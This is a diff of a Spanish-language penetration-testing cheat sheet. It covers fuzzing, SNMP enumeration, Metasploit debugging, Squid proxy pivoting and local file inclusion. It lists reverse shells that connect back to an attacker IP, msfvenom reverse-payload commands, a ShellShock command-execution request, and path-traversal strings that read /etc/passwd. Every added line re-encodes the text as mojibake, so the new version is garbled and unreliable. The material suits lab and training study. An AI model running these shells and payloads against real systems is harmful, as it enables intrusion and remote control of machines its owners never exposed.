-Aunque también se puede hacer uso de **Dirbuster**, siempre he sido más partidiario de lidiar con **Wfuzz**. La sintaxis general para la búsqueda de directorios que empleo es la siguiente:
+Aunque tambiÃ©n se puede hacer uso de **Dirbuster**, siempre he sido mÃ¡s partidiario de lidiar con **Wfuzz**. La sintaxis general para la bÃºsqueda de directorios que empleo es la siguiente:
 
 ```bash
 wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://192.168.1.X/FUZZ
 ```
 
-En caso de querer recorrer un rango numérico, por ejemplo para un caso práctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.
+En caso de querer recorrer un rango numÃ©rico, por ejemplo para un caso prÃ¡ctico donde vemos que contamos con un servicio web desde el cual podemos hacer consultas a otro servicio web, algo que podemos hacer es aprovechar dicha funcionalidad para enumerar puertos internos que corran sobre el sistema desde el cual estamos aplicando las consultas.
 
-Esta parte me recuerda sobre todo a una máquina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la máquina. Con el objetivo de determinar estos puertos, podemos atender a los códigos de estado del lado de la respuesta del servidor, ocultando por ejemplo el código de estado 404:
+Esta parte me recuerda sobre todo a una mÃ¡quina de HackTheBox, donde figuraba ciertos servicios HTTP corriendo que no eran accesibles desde fuera de la mÃ¡quina. Con el objetivo de determinar estos puertos, podemos atender a los cÃ³digos de estado del lado de la respuesta del servidor, ocultando por ejemplo el cÃ³digo de estado 404:
 
 ```bash
 wfuzz -c --hc=404 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
 ```
 
-De esta forma, se nos mostrará únicamente resultados donde se devuelva un código de estado diferente al 404.
+De esta forma, se nos mostrarÃ¡ Ãºnicamente resultados donde se devuelva un cÃ³digo de estado diferente al 404.
 
-De manera alternativa, también podríamos haber aplicado lo siguiente:
+De manera alternativa, tambiÃ©n podrÃ­amos haber aplicado lo siguiente:
 
 ```bash
 wfuzz -c --sc=200 -z range,1-65535 http://192.168.1.X:8080/request_to=http://127.0.0.1:FUZZ
 ```
 
-Para mostrar peticiones que devuelvan un 200 cómo código de estado. Al igual que el código de estado se pueden jugar con más parámetros de filtro, como los caracteres, el número total de líneas, etc.
+Para mostrar peticiones que devuelvan un 200 cÃ³mo cÃ³digo de estado. Al igual que el cÃ³digo de estado se pueden jugar con mÃ¡s parÃ¡metros de filtro, como los caracteres, el nÃºmero total de lÃ­neas, etc.
 
-**Importante:** A la hora de obtener un **Forbidden** en el código de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos válidos vemos que estos son visibles desde la web.
+**Importante:** A la hora de obtener un **Forbidden** en el cÃ³digo de estado de la respuesta del lado del servidor, recomiendo no tirar la toalla... pues a pesar de figurarnos dicha respuesta, podemos seguir enumerando directorios y archivos dentro de dicho directorio, donde tras dar con recursos vÃ¡lidos vemos que estos son visibles desde la web.
 
-Para tener un caso práctico, supongamos que tenemos un directorio **/design** que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeración de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.
+Para tener un caso prÃ¡ctico, supongamos que tenemos un directorio **/design** que nos devuelve un Forbidden. Algo que podemos hacer es configurar una enumeraciÃ³n de doble Payload desde wfuzz a fin de descubrir recursos existentes bajo dicho directorio.
 
 Para ello, nos creamos un fichero _extensions.txt_ con el siguiente contenido:
 
@@ -1373,31 +1372,31 @@ Posteriormente, hacemos uso de Wfuzz siguiendo la siguiente sintaxis:
 
 `wfuzz -c --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z file,extensions http://192.168.1.X/design/FUZZ.FUZ2Z`
 
-De esta forma, estaremos para cada una de las líneas del payload principal comprobando las extensiones especificadas sobre el segundo payload.
+De esta forma, estaremos para cada una de las lÃ­neas del payload principal comprobando las extensiones especificadas sobre el segundo payload.
 
 #### Nikto
 
-Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatización que admiten en el examen y a veces devuelve maravillas... detallo su uso:
+Sinceramente no he llegado a profundizar mucho sobre esta herramienta, pero dado que forma parte de una de las herramientas de automatizaciÃ³n que admiten en el examen y a veces devuelve maravillas... detallo su uso:
 
 `nikto -h http://192.168.1.X`
 
 #### SNMP Enumeration
 
-Aunque se trata de un servicio que corre bajo un puerto por **UDP**, parece inofensivo pero la enumeración sobre dicho servicio nos puede permitir enumerar más de la cuenta a nivel de sistema para saber qué software corren, así como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.
+Aunque se trata de un servicio que corre bajo un puerto por **UDP**, parece inofensivo pero la enumeraciÃ³n sobre dicho servicio nos puede permitir enumerar mÃ¡s de la cuenta a nivel de sistema para saber quÃ© software corren, asÃ­ como rutas, usuarios del sistema, puertos internos abiertos TCP/UDP, etc.
 
-Para detectar si el servicio está operativo:
+Para detectar si el servicio estÃ¡ operativo:
 
 ```bash
 nmap -p161 -sU --open -T5 -v -n 192.168.1.X
 ```
 
-En caso de estar abierto, lo primero será averiguar la _Community String_. Generalmente suele ser **public**, pero por si acaso, nos montamos un ligero diccionario:
+En caso de estar abierto, lo primero serÃ¡ averiguar la _Community String_. Generalmente suele ser **public**, pero por si acaso, nos montamos un ligero diccionario:
 
 ```bash
-┌─[s4vitar@parrot]─[~/Desktop]
-└──╼ $echo -e "public\nprivate\nmanager" > community.txt
-┌─[s4vitar@parrot]─[~/Desktop]
-└──╼ $cat community.txt 
+â”Œâ”€[s4vitar@parrot]â”€[~/Desktop]
+â””â”€â”€â•¼ $echo -e "public\nprivate\nmanager" > community.txt
+â”Œâ”€[s4vitar@parrot]â”€[~/Desktop]
+â””â”€â”€â•¼ $cat community.txt 
 public
 private
 manager
@@ -1424,7 +1423,7 @@ Con esto, tras ver que la Community String es **public**, consideramos los sigui
 1.3.6.1.2.1.6.13.1.3 TCP Local Ports
 ```
 
-Hay muchos más... pero a modo de ejemplo son los más significativos. Suponiendo que quisiéramos saber qué procesos corre el sistema, aplicaríamos el siguiente comando desde **snmpwalk**:
+Hay muchos mÃ¡s... pero a modo de ejemplo son los mÃ¡s significativos. Suponiendo que quisiÃ©ramos saber quÃ© procesos corre el sistema, aplicarÃ­amos el siguiente comando desde **snmpwalk**:
 
 ```bash
 $~ snmpwalk -c public -v1 10.11.1.X 1.3.6.1.2.1.25.1.6.0
@@ -1432,17 +1431,17 @@ $~ snmpwalk -c public -v1 10.11.1.X 1.3.6.1.2.1.25.1.6.0
 
 Inmediatamente, obtendremos una lista de los procesos que corren bajo el sistema.
 
-En caso de querer aplicar un análisis exhaustivo sin especificación de valor **MIB**, aplicamos el siguiente comando:
+En caso de querer aplicar un anÃ¡lisis exhaustivo sin especificaciÃ³n de valor **MIB**, aplicamos el siguiente comando:
 
 ```bash
 $~ snmpwalk -c public -v1 10.11.1.X
 ```
 
-Y seguidamente, se nos listará montón de información relevante de la máquina. Aunque parezca tontería, hay ocasiones en las que gracias a ver la versión de un servicio en concreto a través del **SNMP**, he podido explotar una vulnerabilidad que jamás habría podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.
+Y seguidamente, se nos listarÃ¡ montÃ³n de informaciÃ³n relevante de la mÃ¡quina. Aunque parezca tonterÃ­a, hay ocasiones en las que gracias a ver la versiÃ³n de un servicio en concreto a travÃ©s del **SNMP**, he podido explotar una vulnerabilidad que jamÃ¡s habrÃ­a podido encontrar desde fuera, por lo que lo considero un servicio fundamental a enumerar.
 
 #### Reverse Shell
 
-Un paso fundamental a la hora de logar **RCE** es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aquí un listado de las más utilizadas:
+Un paso fundamental a la hora de logar **RCE** es tener controlados los tipos de conexiones reversas que podemos entablar en distintos lenguajes. Adjunto por aquÃ­ un listado de las mÃ¡s utilizadas:
 
 **Bash**
 ```bash
@@ -1486,7 +1485,7 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while rea
 p.waitFor()
 ```
 
-Así mismo, podemos hacer uso de Metasploit para la creación de nuestros archivos maliciosos:
+AsÃ­ mismo, podemos hacer uso de Metasploit para la creaciÃ³n de nuestros archivos maliciosos:
 
 **PHP (Metasploit)**
 ```bash
@@ -1498,19 +1497,19 @@ msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > s
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f asp > shell.asp
 ```
 
-**WAR (Sesión vía Netcat)**
+**WAR (SesiÃ³n vÃ­a Netcat)**
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f war > shell.war
 ```
 
-**JSP (Sesión vía Netcat)**
+**JSP (SesiÃ³n vÃ­a Netcat)**
 ```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.101 LPORT=443 -f raw > shell.jsp
 ```
 
 #### Spawning a TTY Shell
 
-Aunque en el apartado de **Tratamiento de la TTY** en la sección de Pentesting para Linux, detallo una técnica para mejorar y construir una Shell totalmente interactiva, sí que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuación algunas de ellas:
+Aunque en el apartado de **Tratamiento de la TTY** en la secciÃ³n de Pentesting para Linux, detallo una tÃ©cnica para mejorar y construir una Shell totalmente interactiva, sÃ­ que es cierto que hay varias formas de hacer un spawning de la pseudo-consola. Detallo a continuaciÃ³n algunas de ellas:
 
 * python -c 'import pty; pty.spawn("/bin/sh")'
 * echo os.system('/bin/bash') 
@@ -1533,7 +1532,7 @@ Desde Linux, a la hora de compilar algunos de los exploits que figuren en **Sear
 i686-w64-mingw32-gcc exploit.c -o exploit
 ```
 
-Para máquinas Windows de 32 bits, aplicamos el siguiente comando:
+Para mÃ¡quinas Windows de 32 bits, aplicamos el siguiente comando:
 
 ```bash
 i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
@@ -1541,7 +1540,7 @@ i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
 
 #### Squid Proxy
 
-Alguna que otra máquina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena máquina para practicar el concepto es la máquina **SickOS 1.1** de VulnHub.
+Alguna que otra mÃ¡quina me he encontrado con esta novedad (tampoco es tan moderno su uso). Una buena mÃ¡quina para practicar el concepto es la mÃ¡quina **SickOS 1.1** de VulnHub.
 
 La idea es la siguiente, presento el reporte de un escaneo a modo de ejemplo:
 
@@ -1551,31 +1550,31 @@ TCP: 22     SSH  OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
 TCP: 3128   HTTP-Proxy  Squid http proxy 3.1.19
 ```
 
-Como vemos, sólo figuran esos 2 puertos, sin embargo... el uso del _Squid_ nos puede servir para descubrir un par de puertos más. **Squid** no es más que un servidor _proxy_ para web con caché. 
+Como vemos, sÃ³lo figuran esos 2 puertos, sin embargo... el uso del _Squid_ nos puede servir para descubrir un par de puertos mÃ¡s. **Squid** no es mÃ¡s que un servidor _proxy_ para web con cachÃ©. 
 
-Aunque orientado principalmente a HTTP y HTTPS, soporta también otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:
+Aunque orientado principalmente a HTTP y HTTPS, soporta tambiÃ©n otros protocolos como FTP e incluso Gopher. De entre algunas de las funcionalidades que esta utilidad tiene, destaca:
 
-**Proxy con caché de HTTP, FTP, y otros protocolos de internet**
+**Proxy con cachÃ© de HTTP, FTP, y otros protocolos de internet**
 
-Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de caché especializado en el cual almacena de forma local las páginas consultadas recientemente por los usuarios.
+Squid proporciona un servicio de proxy que soporta peticiones HTTP, HTTPS y FTP a equipos que necesiten acceder a internet y a su vez provee la funcionalidad de cachÃ© especializado en el cual almacena de forma local las pÃ¡ginas consultadas recientemente por los usuarios.
 
-Tan interesante resulta la utilidad que hasta **Metasploit** cuenta con su propio módulo de enumeración de SQUID (**auxiliary/scanner/http/squid_pivot_scanning**), desde donde podemos descubrir nuevos puertos que figuren abiertos.
+Tan interesante resulta la utilidad que hasta **Metasploit** cuenta con su propio mÃ³dulo de enumeraciÃ³n de SQUID (**auxiliary/scanner/http/squid_pivot_scanning**), desde donde podemos descubrir nuevos puertos que figuren abiertos.
 
-Podemos configurar un escaneo desde **nikto** para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta información relevante sobre el mismo:
+Podemos configurar un escaneo desde **nikto** para que aproveche dicho Squid proxy, esto hace que en caso de contar con un servicio web por el puerto 80 podamos obtener cierta informaciÃ³n relevante sobre el mismo:
 
 ```bash
 $~ nikto -h direccionIP -useproxy http://direccionIP:puerto
 ```
 
-Algo interesante es aprovechar la configuración de Firefox para desde la pestaña '_Network_', añadir un nuevo '_Manual proxy configuration_', el cual como campo **HTTP Proxy** disponga la IP del equipo y como puerto el que figure como servicio **Squid Proxy**. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.
+Algo interesante es aprovechar la configuraciÃ³n de Firefox para desde la pestaÃ±a '_Network_', aÃ±adir un nuevo '_Manual proxy configuration_', el cual como campo **HTTP Proxy** disponga la IP del equipo y como puerto el que figure como servicio **Squid Proxy**. Una vez hecho, con acceder directamente a la IP, si esta cuenta con un servicio web por el puerto convencional la veremos directamente desde el navegador.
 
-Las consultas las podemos realizar también desde **curl**, empleando para ello una sintaxis como la que se define a continuación:
+Las consultas las podemos realizar tambiÃ©n desde **curl**, empleando para ello una sintaxis como la que se define a continuaciÃ³n:
 
 ```bash
 $~ curl --proxy ip:puerto http://ip/cgi-bin/status # A modo de ejemplo
 ```
 
-Suponiendo que la web posteriormente es vulnerable a un ataque **ShellShock**, podríamos realizar la siguiente petición para ejecutar comandos sobre el sistema:
+Suponiendo que la web posteriormente es vulnerable a un ataque **ShellShock**, podrÃ­amos realizar la siguiente peticiÃ³n para ejecutar comandos sobre el sistema:
 
 ```bash
 curl -v --proxy ip:puerto \
@@ -1595,9 +1594,9 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 #### Metasploit Debugging
 
-Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotación exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ningún tipo de _Verbose_. Para lidiar con esto, existe una pequeña utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecución, permitiéndonos así saber qué valores están tomando todas las variables así como conocer si se están recogiendo bien los valores que fijamos desde las opciones de configuración.
+Muchas han sido las veces que lanzando un exploit el cual aparentemente parece reunir todos los requisitos necesarios para una explotaciÃ³n exitosa desde Metasploit, no rula, peta o incluso no nos devuelve ningÃºn tipo de _Verbose_. Para lidiar con esto, existe una pequeÃ±a utilidad externa la cual nos permite Debuggear el programa en tiempo de ejecuciÃ³n, permitiÃ©ndonos asÃ­ saber quÃ© valores estÃ¡n tomando todas las variables asÃ­ como conocer si se estÃ¡n recogiendo bien los valores que fijamos desde las opciones de configuraciÃ³n.
 
-Otra opción también recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (útil para ver cómo viaja nuestra petición), y luego enruta al Host remoto.
+Otra opciÃ³n tambiÃ©n recomendable y que trataremos en este punto consiste en configurar un Proxy desde Burpsuite, de manera que primero el Exploit pasa por el intermediario (Ãºtil para ver cÃ³mo viaja nuestra peticiÃ³n), y luego enruta al Host remoto.
 
 **1. Pry-ByeBug**
 
@@ -1622,13 +1621,13 @@ Pry::Commands.command /^$/, "repeat last command" do
 end
 ```
 
-Nos resultará de utilidad para poder jugar con **Alias** en vez de escribir la instrucción entera. Aplicamos el siguiente comando para instalar **pry-byebug**:
+Nos resultarÃ¡ de utilidad para poder jugar con **Alias** en vez de escribir la instrucciÃ³n entera. Aplicamos el siguiente comando para instalar **pry-byebug**:
 
 ```bash
 $~ gem 'pry-byebug'
 ```
 
-Una vez hecho, abrimos nuestro recurso **/opt/metasploit-framework/msfconsole** con nuestro editor preferido y añadimos como requerimiento el **pry-byebug** de la siguiente forma:
+Una vez hecho, abrimos nuestro recurso **/opt/metasploit-framework/msfconsole** con nuestro editor preferido y aÃ±adimos como requerimiento el **pry-byebug** de la siguiente forma:
 
 ```bash
 #
@@ -1636,14 +1635,14 @@ Una vez hecho, abrimos nuestro recurso **/opt/metasploit-framework/msfconsole** 
 #
 
 require 'pathname'
-require 'pry-byebug' # Nueva línea a insertar, las demás están por defecto.
+require 'pry-byebug' # Nueva lÃ­nea a insertar, las demÃ¡s estÃ¡n por defecto.
 
 if ENV['METASPLOIT_FRAMEWORK_PROFILE'] == 'true'
 ```
 
-Para poner un caso práctico, vamos a ponerlo en práctica con la máquina **Dropzone** de HackTheBox. Esta máquina se puede comprometer a través de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.
+Para poner un caso prÃ¡ctico, vamos a ponerlo en prÃ¡ctica con la mÃ¡quina **Dropzone** de HackTheBox. Esta mÃ¡quina se puede comprometer a travÃ©s de un exploit de Metasploit, pero este no rula correctamente tal y como necesitamos para que todo funcione.
 
-El servicio a atacar es el **TFTP**, y el módulo es el **exploit/windows/tftp/distinct_tftp_traversal**. Este exploit, cuenta con las siguientes configuraciones:
+El servicio a atacar es el **TFTP**, y el mÃ³dulo es el **exploit/windows/tftp/distinct_tftp_traversal**. Este exploit, cuenta con las siguientes configuraciones:
 
 ```bash
 Module options (exploit/windows/tftp/distinct_tftp_traversal):
@@ -1662,15 +1661,15 @@ Exploit target:
    0   Distinct TFTP 3.10 on Windows
 ```
 
-En este caso, podemos aplicar un **LFI** sobre el servicio, siendo la variable **DEPTH** la correspondiente al número de veces que queremos retroceder hasta llegar a la ruta raíz. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.
+En este caso, podemos aplicar un **LFI** sobre el servicio, siendo la variable **DEPTH** la correspondiente al nÃºmero de veces que queremos retroceder hasta llegar a la ruta raÃ­z. Este exploit, cuenta con un ligero problema y es que para el caso aplicado, el valor de DEPTH debe valer 0, y por defecto tras setearlo mantiene su valor de 10, lo que hace que el exploit no funcione correctamente.
 
-¿Cómo podríamos haber sabido esto sin mirar el código?, **pry-byebug** será la respuesta a nuestros problemas.
+Â¿CÃ³mo podrÃ­amos haber sabido esto sin mirar el cÃ³digo?, **pry-byebug** serÃ¡ la respuesta a nuestros problemas.
 
-Lo que haremos será generar una instancia del módulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:
+Lo que haremos serÃ¡ generar una instancia del mÃ³dulo importando el mismo sobre el directorio ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb:
 
 ```bash
-┌─[✗]─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ #searchsploit -m exploits/windows/webapps/41714.rb
+â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop]
+â””â”€â”€â•¼ #searchsploit -m exploits/windows/webapps/41714.rb
   Exploit: Distinct TFTP 3.10 - Writable Directory Traversal Execution (Metasploit)
       URL: https://www.exploit-db.com/exploits/41714/
      Path: /usr/share/exploitdb/exploits/windows/webapps/41714.rb
@@ -1679,28 +1678,28 @@ File Type: Ruby script, ASCII text, with CRLF line terminators
 Copied to: /home/s4vitar/Desktop/41714.rb
 
 
-┌─[root@parrot]─[/home/s4vitar/Desktop]
-└──╼ #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb
+â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
+â””â”€â”€â•¼ #cp 41714.rb ~/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb
 ```
 
-Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razón. Una vez hecho, dado que hemos importado la utilidad **pry-byebug** en la nueva instancia de **msfconsole**, lo que nos queda es establecer un **BreakPoint** sobre el módulo que queremos Debuggear. 
+Recordemos que jugamos con instancias para evitar que el binario original pete por alguna razÃ³n. Una vez hecho, dado que hemos importado la utilidad **pry-byebug** en la nueva instancia de **msfconsole**, lo que nos queda es establecer un **BreakPoint** sobre el mÃ³dulo que queremos Debuggear. 
 
-Para ello, abrimos la instancia del módulo, y añadimos la siguiente línea (lo haré en la siguiente porción de código):
+Para ello, abrimos la instancia del mÃ³dulo, y aÃ±adimos la siguiente lÃ­nea (lo harÃ© en la siguiente porciÃ³n de cÃ³digo):
 
 ```bash
   def exploit
     peer = "#{datastore['RHOST']}:#{datastore['RPORT']}"
 
     # Setup the necessary files to do the wbemexec trick
-    binding.pry # <-------------------------------- Nueva línea que hemos añadido
+    binding.pry # <-------------------------------- Nueva lÃ­nea que hemos aÃ±adido
     exe_name = rand_text_alpha(rand(10)+5) + '.exe'
 ```
 
-¿Qué consguimos con esto?, vamos a comprobarlo. Correremos el **msfconsole** desde la ruta **/opt/metasploit-framework/msfconsole**, posteriormente seleccionaremos el nuevo módulo clonado, setearemos el **DEPTH** a 0, configuramos el resto de variables y le daremos a **run**:
+Â¿QuÃ© consguimos con esto?, vamos a comprobarlo. Correremos el **msfconsole** desde la ruta **/opt/metasploit-framework/msfconsole**, posteriormente seleccionaremos el nuevo mÃ³dulo clonado, setearemos el **DEPTH** a 0, configuramos el resto de variables y le daremos a **run**:
 
 ```bash
-┌─[✗]─[root@parrot]─[/opt/metasploit-framework]
-└──╼ #/opt/metasploit-framework/msfconsole -q
+â”Œâ”€[âœ—]â”€[root@parrot]â”€[/opt/metasploit-framework]
+â””â”€â”€â•¼ #/opt/metasploit-framework/msfconsole -q
 [*] Starting persistent handler(s)...
 msf > use exploit/windows/tftp/exploit_tftp 
 msf exploit(windows/tftp/exploit_tftp) > show options
@@ -1768,9 +1767,9 @@ From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 86 Msf::M
 [1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
 ```
 
-En este preciso instante, nos situaríamos en la línea 86 del código del programa, manteniendo el mismo en estado de pausa (esto es así debido a que es en la línea superior donde hemos fijado el Breakpoint).
+En este preciso instante, nos situarÃ­amos en la lÃ­nea 86 del cÃ³digo del programa, manteniendo el mismo en estado de pausa (esto es asÃ­ debido a que es en la lÃ­nea superior donde hemos fijado el Breakpoint).
 
-Llegados a este punto, si nos fijamos, en esa misma línea se va a almacenar un valor para la variable exe_name, ¿podríamos ver el valor que se almacena en dicha variable?, la respuesta es sí... para ello necesitamos avanzar una instrucción en la línea del programa para posteriormente ver su contenido. Lo haríamos de la siguiente forma:
+Llegados a este punto, si nos fijamos, en esa misma lÃ­nea se va a almacenar un valor para la variable exe_name, Â¿podrÃ­amos ver el valor que se almacena en dicha variable?, la respuesta es sÃ­... para ello necesitamos avanzar una instrucciÃ³n en la lÃ­nea del programa para posteriormente ver su contenido. Lo harÃ­amos de la siguiente forma:
 
 ```bash
 [1] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)> n
@@ -1808,7 +1807,7 @@ From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 87 Msf::M
 [2] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
 ```
 
-Donde como vemos, el valor que está almacenando dicha variable es **xMDsIBr.exe**. De igual manera, podríamos ver como las variables **depth** y **levels** no toman el valor que deberían. Para ello, podremos establecer un Breakpoint en la línea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.
+Donde como vemos, el valor que estÃ¡ almacenando dicha variable es **xMDsIBr.exe**. De igual manera, podrÃ­amos ver como las variables **depth** y **levels** no toman el valor que deberÃ­an. Para ello, podremos establecer un Breakpoint en la lÃ­nea 96, dado que en este punto ya ambas variables se encuentran declarados y con valor.
 
 Aplicamos los siguientes comandos:
 
@@ -1865,13 +1864,13 @@ From: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::M
 [5] pry(#<Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule>)>
 ```
 
-Como vemos, el valor de la variable **levels** es (**../../../../../../../../../../**), lo que hace que nos planteemos que no se está almacenando correctamente el valor de nuestro **DEPTH**. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente línea del programa:
+Como vemos, el valor de la variable **levels** es (**../../../../../../../../../../**), lo que hace que nos planteemos que no se estÃ¡ almacenando correctamente el valor de nuestro **DEPTH**. Dado que de esta forma hemos podido localizar el fallo, ahora podemos atender a la siguiente lÃ­nea del programa:
 
 ```bash
 92:   depth  = (datastore['DEPTH'].nil? or datastore['DEPTH'] == 0) ? 10 : datastore['DEPTH']
 ```
 
-Donde como vemos, se especifica claramente que en caso de que el valor de **DEPTH** valga 0, esta se igualará a 10. Por lo que, deberíamos cambiar la declaración a lo siguiente:
+Donde como vemos, se especifica claramente que en caso de que el valor de **DEPTH** valga 0, esta se igualarÃ¡ a 10. Por lo que, deberÃ­amos cambiar la declaraciÃ³n a lo siguiente:
 
 ```bash
 92:   depth  = datastore['DEPTH']
@@ -1992,9 +1991,9 @@ Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya 
 
 **2. Burpsuite**
 
-Otra opción para los menos valientes (aunque a veces también la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pestaña de Proxies (**Options**), añadimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pestaña **Request Handling**, debe redireccionar al Host víctima así como al puerto real donde se encuentre el servicio configurado que queremos analizar.
+Otra opciÃ³n para los menos valientes (aunque a veces tambiÃ©n la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pestaÃ±a de Proxies (**Options**), aÃ±adimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pestaÃ±a **Request Handling**, debe redireccionar al Host vÃ­ctima asÃ­ como al puerto real donde se encuentre el servicio configurado que queremos analizar.
 
-Lo que conseguimos con esto, es que de visualizar el recurso **http://localhost:4646**, nos cargue el mismo contenido que el del servicio web del Host víctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) así como el puerto 4646 para que todo el tráfico sea interceptado desde Burpsuite y posteriormente redireccionado al Host víctima. Esto nos permite analizar por ejemplo desde el **Repeater** cómo es la respuesta del lado del servidor una vez se envía el exploit al Host víctima.
+Lo que conseguimos con esto, es que de visualizar el recurso **http://localhost:4646**, nos cargue el mismo contenido que el del servicio web del Host vÃ­ctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) asÃ­ como el puerto 4646 para que todo el trÃ¡fico sea interceptado desde Burpsuite y posteriormente redireccionado al Host vÃ­ctima. Esto nos permite analizar por ejemplo desde el **Repeater** cÃ³mo es la respuesta del lado del servidor una vez se envÃ­a el exploit al Host vÃ­ctima.
 
 ### Pentesting Web
 
@@ -2002,7 +2001,7 @@ Lo que conseguimos con esto, es que de visualizar el recurso **http://localhost:
 
 Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un **Directory Path Transversal**.
 
-A modo de ejemplo, presento a continuación un script en PHP con dicha vulnerabilidad:
+A modo de ejemplo, presento a continuaciÃ³n un script en PHP con dicha vulnerabilidad:
 
 ```php
 <?php
@@ -2011,25 +2010,25 @@ A modo de ejemplo, presento a continuación un script en PHP con dicha vulnerabi
 ?>
 ```
 
-Suponiendo que el fichero se llama _file.php_, si desde la URL efectuamos la siguiente búsqueda:
+Suponiendo que el fichero se llama _file.php_, si desde la URL efectuamos la siguiente bÃºsqueda:
 
 `http://localhost/file.php?file=/etc/passwd`
 
-Veremos cómo se nos lista el fichero passwd del equipo Linux local. Habrán ocasiones en las que tengamos que recorrer un par de directorios hacia atrás para visualizar el recurso:
+Veremos cÃ³mo se nos lista el fichero passwd del equipo Linux local. HabrÃ¡n ocasiones en las que tengamos que recorrer un par de directorios hacia atrÃ¡s para visualizar el recurso:
 
 `http://localhost/file.php?file=../../../../../etc/passwd`
 
-Así como incorporar un **%00** para el bypassing de restricciones implementadas:
+AsÃ­ como incorporar un **%00** para el bypassing de restricciones implementadas:
 
 `http://localhost/file.php?file=../../../../../etc/passwd%00`
 
-Otra forma también de bypassear posibles restricciones es añadiendo un interrogante al final de la petición:
+Otra forma tambiÃ©n de bypassear posibles restricciones es aÃ±adiendo un interrogante al final de la peticiÃ³n:
 
 `http://localhost/file.php?file=../../../../../etc/passwd?`
 
-Por [aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras técnicas de bypassing.
+Por [aquÃ­](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal) os dejo un buen recurso para el uso de Wrappers y otras tÃ©cnicas de bypassing.
 
